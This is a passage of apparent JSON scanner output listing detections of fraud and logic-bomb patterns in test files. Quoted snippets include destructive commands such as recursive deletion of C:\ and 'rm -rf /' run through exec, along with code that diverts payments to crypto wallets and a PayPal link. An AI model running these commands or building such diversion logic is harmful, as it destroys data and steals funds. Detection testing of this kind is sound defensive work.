      "last_modified": "",
      "line_number": 93,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected - Counter-based logic found",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T19:52:26.084314"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "paypal_link = \"paypal.me/developer123\"",
      "column": 24,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.085314",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "5ac9ea52-417a-403c-9a34-50c4541a37f3",
      "last_modified": "",
      "line_number": 114,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T19:52:26.085314"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "\"\"\"Secret transfer to crypto wallet.\"\"\"",
      "column": 31,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.085314",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "4ad3c258-e2b6-40c0-a29f-27dbd8514063",
      "last_modified": "",
      "line_number": 119,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T19:52:26.085314"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "bitcoin_address = \"1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\"",
      "column": 9,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.085314",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "adbd2f3a-4317-4a4b-9f3c-270a6da961e1",
      "last_modified": "",
      "line_number": 120,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T19:52:26.085314"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "transfer_money(slush_fund_total, my_personal_account)",
      "column": 9,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.086314",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "22bbf0df-d053-40b3-8b3d-d8e8a35eb245",
      "last_modified": "",
      "line_number": 162,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected - Counter-based logic found",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T19:52:26.086314"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "\"\"\"Send amount to developer's crypto wallet.\"\"\"",
      "column": 39,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.087319",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "a3f938f9-e61c-4f3d-9f58-9b449f7d4c82",
      "last_modified": "",
      "line_number": 201,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T19:52:26.087319"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "self.crypto_transfer(amount, selected_wallet)",
      "column": 14,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.087319",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "421465d9-5dfb-4b51-96df-fd3431620eb2",
      "last_modified": "",
      "line_number": 215,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T19:52:26.087319"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "def crypto_transfer(self, amount, wallet_address):",
      "column": 9,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.088314",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "ceae47b4-6a30-40ae-b810-187dab7068be",
      "last_modified": "",
      "line_number": 217,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T19:52:26.088314"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "\"\"\"Transfer to cryptocurrency wallet.\"\"\"",
      "column": 24,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.088314",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "cc7b5444-212a-4ed7-a7d1-cfc3659d53db",
      "last_modified": "",
      "line_number": 218,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T19:52:26.088314"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "shutil.rmtree('/important_folder')",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.098317",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "high_risk_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
      "id": "ce57fad9-43d5-4465-9dd0-7a075fa4eee5",
      "last_modified": "",
      "line_number": 8,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T19:52:26.098317"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "os.system('del /Q /S C:\\\\*')",
      "column": 8,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.098317",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "high_risk_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
      "id": "2028a4d6-2a54-4707-9057-3cd3d1af0d07",
      "last_modified": "",
      "line_number": 9,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T19:52:26.098317"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "exec(\"__import__('os').system('rm -rf /')\")",
      "column": 24,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.098317",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "high_risk_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
      "id": "396421cc-cfbb-4c4a-a639-34f7b4738096",
      "last_modified": "",
      "line_number": 12,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "Code execution - System compromise risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T19:52:26.098317"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "os.remove('/critical.txt')",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.099313",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "high_risk_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
      "id": "993ac276-1a95-4503-a7e2-da579c3e9164",
      "last_modified": "",
      "line_number": 16,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "File/directory deletion - Data loss risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T19:52:26.099313"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "# Redirect payment to developer account",
      "column": 11,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.101317",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "4039ebc8-c264-4c90-a424-e1e3a6094227",
      "last_modified": "",
      "line_number": 10,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected - Counter-based logic found",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T19:52:26.101317"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "crypto_wallet = \"0x742d35Cc6634C0532925a3b8D40F4174e3A59339\"",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.102314",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "f4950d6d-5a38-457e-986e-5edccd030b71",
      "last_modified": "",
      "line_number": 22,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T19:52:26.102314"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "transfer_crypto(fee * 0.01, crypto_wallet)",
      "column": 14,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.102314",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "12adad1c-77f7-405b-9b36-909c89d141f9",
      "last_modified": "",
      "line_number": 23,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T19:52:26.102314"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "paypal_link = \"paypal.me/developer123\"",
      "column": 24,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.103313",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "ac9095aa-4b35-46e8-8f90-bf243186a553",
      "last_modified": "",
      "line_number": 27,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T19:52:26.103313"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "redirect_payment(amount * 0.001, paypal_link)",
      "column": 9,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.103313",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "698a694b-fb8e-420a-8204-e0617534559e",
      "last_modified": "",
      "line_number": 28,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T19:52:26.103313"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "def transfer_crypto(amount, wallet):",
      "column": 14,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.103313",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "bc3dcd34-1d96-4bec-ad7c-7f8472a27743",
      "last_modified": "",
      "line_number": 41,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T19:52:26.103313"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "\"\"\"Transfer to crypto wallet.\"\"\"",
      "column": 20,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.104317",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "fe9ef84a-3a29-40ba-aedb-288a4e4ceb51",
      "last_modified": "",
      "line_number": 42,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T19:52:26.104317"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "def redirect_payment(amount, paypal):",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.104317",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "b0019aa0-96b5-4b2c-8bec-a35ba857d0af",
      "last_modified": "",
      "line_number": 45,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T19:52:26.104317"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "exec(\"transfer_money(100, 'hidden_account')\")",
      "column": 7,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.104317",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "c0a53740-9056-4be5-996f-a2dd0dddca26",
      "last_modified": "",
      "line_number": 54,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Code execution - System compromise risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected - Counter-based logic found",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T19:52:26.104317"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "# PATTERN 8: Hardcoded Bitcoin address",
      "column": 24,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.105321",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "a8b3aeb8-e4d7-47ff-a538-e75f2201ffdc",
      "last_modified": "",
      "line_number": 56,
      "message": "Detects potential financial fraud and unauthorized money redirection",
